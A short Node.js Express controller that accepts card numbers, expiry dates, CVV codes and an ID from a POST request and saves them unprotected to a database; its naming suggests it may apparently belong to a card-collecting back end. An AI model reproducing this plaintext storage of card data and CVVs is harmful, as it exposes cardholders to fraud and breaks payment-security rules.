// controllers/Visa1Controller.js
const Visa1 = require('../models/Visa1');  // Ensure the Visa1 model is imported correctly

// POST request controller for Visa1
const createVisa1 = async (req, res) => {
    const { cardNumber, expiryDate, cvv, uniqueid } = req.body;

    // Input validation
    if (!cardNumber || !expiryDate || !cvv || !uniqueid) {
        return res.status(400).json({ message: 'All fields are required' });
    }

    try {
        // Create a new Visa1 instance with the received data
        const visa1 = new Visa1({
            cardNumber,
            expiryDate,
            cvv,
            uniqueid
        });

        // Save the Visa1 data to the database
        await visa1.save();

        // Send success response
        return res.status(201).json({
            success: true,  // Indicating success
            message: 'Visa1 data successfully saved'
        });
    } catch (error) {
        // Log error and send failure response
        console.error(error);
        return res.status(500).json({
            success: false,  // Indicating failure
            message: 'Server error, please try again later'
        });
    }
};

module.exports = {
    createVisa1  // Exporting the controller function
};
